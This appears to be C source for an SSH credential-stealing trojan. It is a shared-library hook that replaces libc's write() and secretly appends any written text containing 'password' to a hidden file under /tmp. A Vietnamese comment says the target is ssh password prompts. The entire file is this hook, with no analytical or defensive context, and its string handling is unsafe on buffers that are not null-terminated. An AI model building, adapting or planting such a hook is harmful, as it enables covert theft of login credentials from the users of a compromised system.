#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define LOG_FILE "/tmp/.log_sshtrojan2.txt"

ssize_t write(int fd, const void *buf, size_t count) {
    static ssize_t (*original_write)(int, const void *, size_t) = NULL;
    if (!original_write) {
        original_write = dlsym(RTLD_NEXT, "write");
    }

    // Kiểm tra nếu `ssh` đang yêu cầu nhập mật khẩu
    if (count > 0 && strstr(buf, "password") != NULL) {
        int log_fd = open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0600);
        if (log_fd >= 0) {
            dprintf(log_fd, "[+] Captured SSH Login: %s\n", (char *)buf);
            close(log_fd);
        }
    }

    return original_write(fd, buf, count);
}